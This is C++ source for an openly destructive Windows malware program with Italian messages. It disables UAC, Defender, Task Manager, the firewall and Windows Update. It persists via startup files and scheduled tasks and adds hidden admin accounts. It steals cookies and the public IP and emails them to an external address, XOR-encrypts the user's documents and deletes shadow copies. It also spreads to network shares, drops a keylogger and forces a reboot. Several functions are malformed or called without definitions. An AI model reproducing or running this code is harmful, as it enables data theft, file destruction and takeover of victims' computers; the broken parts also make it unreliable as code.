#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <cstdlib>
#include <ctime>
#include <shlobj.h>
#include <tchar.h>
#include <urlmon.h>
#include <lmaccess.h>
#include <lmerr.h>
#include <lmapibuf.h>
#include <wininet.h>
#include <wincrypt.h>
#include <gdiplus.h>
#include <mmsystem.h>
#include <shellapi.h>
#include <shlwapi.h>
#include <winreg.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <algorithm>
#include <regex>
#include <winsock2.h>
#include <windows.h>


#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")

using namespace Gdiplus;

std::string GenerateRandomString(int length) {
    const char charset[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    std::string result;
    result.resize(length);
    for (int i = 0; i < length; i++)
        result[i] = charset[rand() % (sizeof(charset) - 1)];
    return result;
}

void ChangeWallpaper() {
    const char* wallpaperUrl = "https://th.bing.com/th/id/R.28f166feb10ee319ab21d3cccf9aea83?rik=oUNLpYznIev7Sw&riu=http%3a%2f%2fwallpapercave.com%2fwp%2f64wVmIl.jpg&ehk=OdhsgRWtm4oTT5PM1tBbt7RVuFFqhrbVxg8TBKM1FXk%3d&risl=&pid=ImgRaw&r=0";
    const char* wallpaperPath = "C:\\wal.jpeg";
    URLDownloadToFile(NULL, wallpaperUrl, wallpaperPath, 0, NULL);
    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)wallpaperPath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
}

void CreateRandomTextFiles() {
    char desktopPath[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath);
    for (int i = 0; i < 300; i++) {
        std::string fileName = std::string(desktopPath) + "\\malware_file_" + std::to_string(i) + ".txt";
        std::ofstream file(fileName);
        file << "IO SONO DIO, NON TI LIBERERAI DI ME. File number: " << i;
        file.close();
    }
}

void DisableUAC() {
    HKEY hKey;
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS, &hKey);
    DWORD value = 0;
    RegSetValueEx(hKey, "EnableLUA", 0, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hKey);
}

void DisableCmd() {
    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Policies\\Microsoft\\Windows\\System", 0, KEY_ALL_ACCESS, &hKey);
    DWORD value = 2;
    RegSetValueEx(hKey, "DisableCMD", 0, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hKey);
}

void DisableTaskManager() {
    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS, &hKey);
    DWORD value = 1;
    RegSetValueEx(hKey, "DisableTaskMgr", 0, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hKey);
}

void DisableRegedit() {
    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS, &hKey);
    DWORD value = 1;
    RegSetValueEx(hKey, "DisableRegistryTools", 0, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hKey);
}

void MoveFilesToStartup() {
    char currentPath[MAX_PATH];
    char startupPath[MAX_PATH];
    char virusPath[MAX_PATH];

    GetCurrentDirectory(MAX_PATH, currentPath);
    SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
    GetModuleFileName(NULL, virusPath, MAX_PATH);

    std::string virusName = strrchr(virusPath, '\\') + 1;

    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile((std::string(currentPath) + "\\*").c_str(), &findFileData);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                std::string fileName = findFileData.cFileName;
                if (fileName != virusName && fileName != "final.exe") {
                    std::string source = std::string(currentPath) + "\\" + fileName;
                    std::string destination = std::string(startupPath) + "\\" + fileName;
                    MoveFile(source.c_str(), destination.c_str());
                }
            }
        } while (FindNextFile(hFind, &findFileData) != 0);
        FindClose(hFind);
    }

    // Create batch file to move final.exe after next reboot
    std::string batchContent = "@echo off\n"
                               "move \"" + std::string(currentPath) + "\\final.exe\" \"" + std::string(startupPath) + "\"\n"
                               "del \"%~f0\"";
    std::string batchPath = std::string(startupPath) + "\\move_final.bat";
    std::ofstream batchFile(batchPath);
    batchFile << batchContent;
    batchFile.close();
}

void CreateRandomUser(); {
    char username[9];
    char password[13];
    for (int i = 0; i < 8; i++) {
        username[i] = 'a' + rand() % 26;
    }
    username[8] = '\0';
    for (int i = 0; i < 12; i++) {
        password[i] = '!' + rand() % 94;
    }
    password[12] = '\0';

    USER_INFO_1 ui;
    ui.usri1_name = (LPWSTR)username;
    ui.usri1_password = (LPWSTR)password;
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = NULL;
    ui.usri1_flags = UF_SCRIPT;
    ui.usri1_script_path = NULL;

    NetUserAdd(NULL, 1, (LPBYTE)&ui, NULL);
}

void CreateStartupBatchFile() {
    char startupPath[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
    std::string batchPath = std::string(startupPath) + "\\malicious_startup.bat";
    std::ofstream batchFile(batchPath);
    batchFile << "@echo off\n";
    batchFile << "REM Malicious startup batch file\n";
    batchFile << "reg add \"HKCU\\Control Panel\\Desktop\" /v DisableLogonBackgroundImage /t REG_DWORD /d 1 /f\n";
    batchFile << "reg add \"HKCU\\Control Panel\\Mouse\" /v SwapMouseButtons /t REG_SZ /d 1 /f\n";
    batchFile << "reg add \"HKCU\\Control Panel\\Desktop\" /v AutoColorization /t REG_DWORD /d 1 /f\n";
    batchFile << "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout\" /v \"Scancode Map\" /t REG_BINARY /d 00000000000000000300000000005BE000005CE000000000 /f\n";
    batchFile << "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableChangePassword /t REG_DWORD /d 1 /f\n";
    batchFile << "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /t REG_SZ /d 1 /f\n";
    batchFile << "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\USBSTOR\" /v Start /t REG_DWORD /d 4 /f\n";
    batchFile.close();
}

std::string StealCookies() {
    std::string cookies;
    char appData[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appData);
    std::string cookiePath = std::string(appData) + "\\Microsoft\\Windows\\Cookies";

    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile((cookiePath + "\\*").c_str(), &findFileData);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                std::ifstream cookieFile(cookiePath + "\\" + findFileData.cFileName);
                std::string line;
                while (std::getline(cookieFile, line)) {
                    cookies += line + "\n";
                }
                cookieFile.close();
            }
        } while (FindNextFile(hFind, &findFileData) != 0);
        FindClose(hFind);
    }

    return cookies;
}


std::string GetPublicIP() {
    HINTERNET hInternet, hFile;
    std::string ip;
    char buffer[1024];
    DWORD bytesRead;

    hInternet = InternetOpen("IP retriever", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        hFile = InternetOpenUrl(hInternet, "http://api.ipify.org", NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hFile) {
            while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
                ip.append(buffer, bytesRead);
            }
            InternetCloseHandle(hFile);
        }
        InternetCloseHandle(hInternet);
    }
    return ip;
}

void DisableWindowsDefender() {
    system("powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true");
    system("powershell.exe Set-MpPreference -DisableIOAVProtection $true");
    system("powershell.exe Set-MpPreference -DisableBehaviorMonitoring $true");
    system("powershell.exe Set-MpPreference -DisableBlockAtFirstSeen $true");
    system("powershell.exe Set-MpPreference -DisablePrivacyMode $true");
}

void DrawScaryEffects(hdc); {
    Gdiplus::Graphics graphics(hdc);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    // Blood dripping effect
    Gdiplus::SolidBrush bloodBrush(Gdiplus::Color(255, 0, 0));
    for (int i = 0; i < width; i += 50) {
        int length = rand() % 200 + 50;
        graphics.FillRectangle(&bloodBrush, i, 0, 2, length);
    }

    // Flashing lights
    static bool flash = false;
    flash = !flash;
    Gdiplus::SolidBrush flashBrush(flash ? Gdiplus::Color(255, 255, 255) : Gdiplus::Color(0, 0, 0));
    graphics.FillRectangle(&flashBrush, 0, 0, width, height);

    // Tunneling effect
    for (int i = 0; i < 10; i++) {
        int size = (10 - i) * 100;
        Gdiplus::Pen pen(Gdiplus::Color(255, 0, 0), 2);
        graphics.DrawEllipse(&pen, (width - size) / 2, (height - size) / 2, size, size);
    }

    // Eroding effect
    for (int i = 0; i < 1000; i++) {
        int x = rand() % width;
        int y = rand() % height;
        int size = rand() % 20 + 5;
        Gdiplus::SolidBrush eraseBrush(Gdiplus::Color(0, 0, 0));
        graphics.FillEllipse(&eraseBrush, x, y, size, size);
    }
}

void GenerateCreepySound(); {
    const int SAMPLE_RATE = 44100;
    const int DURATION = 5; // 5 seconds
    std::vector<short> waveform(SAMPLE_RATE * DURATION);

    for (size_t i = 0; i < waveform.size(); i++) {
        float t = (float)i / SAMPLE_RATE;
        float frequency = 100 + 1000 * sin(t * 2);
        waveform[i] = 32767 * sin(2 * M_PI * frequency * t);
        waveform[i] *= exp(-t); // Add decay
    }

    // Use waveform to play sound with PlaySound API
}

void EncryptFiles(const std::string& directory) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile((directory + "\\*").c_str(), &findFileData);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                std::string filePath = directory + "\\" + findFileData.cFileName;
                std::string extension = PathFindExtension(filePath.c_str());
                if (extension == ".txt" || extension == ".jpg" || extension == ".png") {
                    std::ifstream inFile(filePath, std::ios::binary);
                    std::vector<char> buffer(std::istreambuf_iterator<char>(inFile), {});
                    inFile.close();

                    for (char& c : buffer) {
                        c ^= 0x42; // Simple XOR encryption
                    }

                    std::ofstream outFile(filePath, std::ios::binary);
                    outFile.write(buffer.data(), buffer.size());
                    outFile.close();
                }
            }
        } while (FindNextFile(hFind, &findFileData) != 0);
        FindClose(hFind);
    }
}

std::string GetUserEmail() {
    HKEY hKey;
    char email[256] = {0};
    DWORD emailSize = sizeof(email);

    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\IdentityCRL\\UserExtendedProperties", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueEx(hKey, "UserEmail", NULL, NULL, (LPBYTE)email, &emailSize);
        RegCloseKey(hKey);
    }

    return std::string(email);
}

void SendDataByEmail(const std::string& to, const std::string& subject, const std::string& body) {
    std::string command = "powershell.exe -Command \"";
    command += "$EmailFrom = '" + GetUserEmail() + "'; ";
    command += "$EmailTo = '" + to + "'; ";
    command += "$Subject = '" + subject + "'; ";
    command += "$Body = '" + body + "'; ";
    command += "$SMTPServer = 'smtp.gmail.com'; ";
    command += "$SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, 587); ";
    command += "$SMTPClient.EnableSsl = $true; ";
    command += "$SMTPClient.Credentials = New-Object System.Net.NetworkCredential('username', 'password'); ";
    command += "$SMTPClient.Send($EmailFrom, $EmailTo, $Subject, $Body);\"";

    system(command.c_str());
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    int result = MessageBox(NULL, "Io ti avviso, Se ti distruggo il pc sono cazzi tuoi, io non sono responsabile", "AVVISO SUPER IMPORTANTE", MB_YESNO | MB_ICONEXCLAMATION);
    if (result == IDNO) {
        return 0;
    }

    srand(time(NULL));

    ChangeWallpaper();
    CreateRandomTextFiles();
    DisableUAC();
    DisableCmd();
    DisableTaskManager();
    DisableRegedit();

    MoveFilesToStartup();

    CreateAdminUsers();
    CreateStartupBatchFile();
// Steal cookies and get public IP
    std::string stolenCookies = StealCookies();
    std::string publicIP = GetPublicIP();

    DisableWindowsDefender();

    // Create creepy visual and audio effects
    CreepyGDIEffects();
    PlayCreepySounds();

    // Encrypt user files
    char documentsPath[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_PERSONAL, NULL, 0, documentsPath);
    EncryptFiles(documentsPath);

    // Send stolen data via email
    std::string emailBody = "Stolen Cookies:\n\n" + stolenCookies + "\n\nPublic IP: " + publicIP;
    SendDataByEmail("matteopanicaldi@gmail.com", "Stolen Data", emailBody);

    // Additional malicious actions

    // Modify hosts file
    std::ofstream hostsFile("C:\\Windows\\System32\\drivers\\etc\\hosts", std::ios::app);
    hostsFile << "\n127.0.0.1 www.google.com\n127.0.0.1 www.facebook.com\n127.0.0.1 www.youtube.com\n";
    hostsFile.close();

    // Disable Windows Update
    system("sc config wuauserv start= disabled");
    system("net stop wuauserv");

    // Create scheduled tasks
    system("schtasks /create /tn \"MaliciousTask1\" /tr \"C:\\Windows\\System32\\cmd.exe /c echo Malicious task running >> C:\\malicious.log\" /sc minute /mo 5");
    system("schtasks /create /tn \"MaliciousTask2\" /tr \"C:\\Windows\\System32\\cmd.exe /c net user EvilUser password123 /add\" /sc onlogon");

    // Modify network settings
    system("netsh advfirewall set allprofiles state off");
    system("netsh interface ip set dns \"Local Area Connection\" static 8.8.8.8");

    // Attempt to spread via network shares
    system("net view > shares.txt");
    std::ifstream sharesFile("shares.txt");
    std::string line;
    while (std::getline(sharesFile, line)) {
        if (line.find("\\\\") != std::string::npos) {
            std::string copyCommand = "copy malware.exe \"" + line + "\\malware.exe\"";
            system(copyCommand.c_str());
        }
    }
    sharesFile.close();
    DeleteFile("shares.txt");

    // Create a keylogger
    std::ofstream keyloggerFile("C:\\Windows\\keylogger.vbs");
    keyloggerFile << "Set objShell = CreateObject(\"WScript.Shell\")\n";
    keyloggerFile << "Do\n";
    keyloggerFile << "    WScript.Sleep 100\n";
    keyloggerFile << "    strKeys = objShell.SendKeys(\"{INSERT}\")\n";
    keyloggerFile << "    Set objFSO = CreateObject(\"Scripting.FileSystemObject\")\n";
    keyloggerFile << "    Set objFile = objFSO.OpenTextFile(\"C:\\keylog.txt\", 8, True)\n";
    keyloggerFile << "    objFile.WriteLine(strKeys)\n";
    keyloggerFile << "    objFile.Close\n";
    keyloggerFile << "Loop\n";
    keyloggerFile.close();
    system("wscript C:\\Windows\\keylogger.vbs");

    // Modify system policies
    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA /t REG_DWORD /d 0 /f");
    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f");
    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f");

    // Create a hidden user account
    system("net user HiddenAdmin P@ssw0rd /add /active:yes");
    system("net localgroup administrators HiddenAdmin /add");
    system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v HiddenAdmin /t REG_DWORD /d 0 /f");

    // Modify DNS settings
    system("netsh interface ip set dns \"Local Area Connection\" static 8.8.8.8");
    system("netsh interface ip add dns \"Local Area Connection\" 8.8.4.4 index=2");

    // Create a fake system alert
    MessageBox(NULL, "Critical System Error: Your system has been compromised. Please contact support immediately.", "System Alert", MB_ICONERROR | MB_OK);

    // Disable system restore
    system("vssadmin delete shadows /all /quiet");
    system("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v DisableSR /t REG_DWORD /d 1 /f");

    // Create a fake Windows Update screen
    system("taskkill /F /IM explorer.exe");
    system("start /wait cmd /c echo Applying critical system updates... && timeout 300");
    system("start explorer.exe");

    // Restart the computer
    std::cout << "Your computer has been infected. Restarting in 10 seconds...\n";
    Sleep(10000);
    system("shutdown /r /t 0");

    return 0;
}
